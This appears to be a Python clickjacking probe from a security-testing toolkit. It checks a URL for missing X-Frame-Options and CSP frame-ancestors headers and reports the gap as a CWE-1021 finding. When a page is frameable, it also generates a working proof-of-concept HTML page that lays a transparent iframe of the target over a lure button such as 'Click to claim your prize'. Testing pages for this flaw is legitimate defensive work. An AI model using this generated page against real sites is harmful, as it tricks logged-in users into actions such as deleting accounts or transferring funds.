#!/usr/bin/env python
"""clickjack_probe.py — clickjacking frameability check + PoC builder (stdlib only).

Checks whether a URL is FRAMEABLE (no X-Frame-Options DENY/SAMEORIGIN AND no CSP frame-ancestors).
If frameable, emits a clickjacking PoC HTML (iframes the target; a lure button overlaid over the
target's state-changing region) — the attacker hosts this, lures a logged-in victim, their click
hits the framed sensitive action. A finding only when frameable; severity depends on whether a
state-changing/sensitive action sits on the frameable page (the operator confirms the action).

Usage: python clickjack_probe.py <url> [--action-label "Delete account"] [--out poc.html]
"""
import os, sys, json, re, argparse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _http import get as http_get

def headers_of(url):
    r = http_get(url, timeout=12)
    return (None, {}) if r.error else (r.status, r.headers)  # r.headers is lower-cased

def check(url, action_label):
    s, h = headers_of(url)
    xfo = (h.get("x-frame-options") or "").upper()
    csp = h.get("content-security-policy") or ""
    fa = re.search(r"frame-ancestors\s+([^;]+)", csp, re.I)
    fa_val = fa.group(1).strip() if fa else None
    # frameable = no XFO (DENY/SAMEORIGIN) AND no CSP frame-ancestors that excludes all
    blocked_by_xfo = any(k in xfo for k in ("DENY", "SAMEORIGIN"))
    blocked_by_csp = bool(fa) and not re.search(r"\*", fa_val) and "self" not in (fa_val or "").lower().split()
    # 'frame-ancestors none' or a specific-allowlist also blocks; only truly absent = frameable
    frameable = not blocked_by_xfo and not fa
    poc = ""
    if frameable:
        label = action_label or "Click to win"
        poc = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>{label}</title>
<style>body{{font-family:sans-serif;text-align:center;margin-top:60px}}
.wrap{{position:relative;display:inline-block}}
iframe{{opacity:0.0;position:absolute;top:0;left:0;width:600px;height:300px;z-index:2;border:0}}
button{{font-size:20px;padding:14px 28px;background:#2d8cf3;color:#fff;border:0;border-radius:6px;cursor:pointer}}
</style></head><body><div class="wrap">
<button>{label}</button>
<iframe src="{url}"></iframe></div>
<script>// the transparent iframe overlays the button; the victim's click lands on the framed target's action</script>
</body></html>"""
    return {"target": url, "ok": True, "status": s, "x_frame_options": xfo or None,
            "csp_frame_ancestors": fa_val, "frameable": frameable,
            "poc_html": poc,
            "findings": [{"id": "clickjacking-frameable", "severity": "medium",
                          "detail": f"the page is FRAMEABLE (no X-Frame-Options, no CSP frame-ancestors). A logged-in victim on an attacker page can be lured into clicking a framed state-changing action (CWE-1021). Severity scales with whether a sensitive/state-changing action sits on this page — confirm the action."
                         }] if frameable else [],
            "note": "frameable + a sensitive one-click action (delete/transfer/grant) = real clickjacking; the PoC overlays a lure button over the framed action. urllib-blind through a JS-challenge WAF (re-test via browser)."}

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Clickjacking frameability + PoC builder")
    ap.add_argument("url"); ap.add_argument("--action-label", default="Click to claim your prize")
    ap.add_argument("--out", help="write the PoC HTML to a file")
    a = ap.parse_args()
    r = check(a.url, a.action_label)
    if a.out and r.get("poc_html"):
        open(a.out, "w", encoding="utf-8").write(r["poc_html"]); r["poc_written_to"] = a.out
    print(json.dumps(r, indent=2))
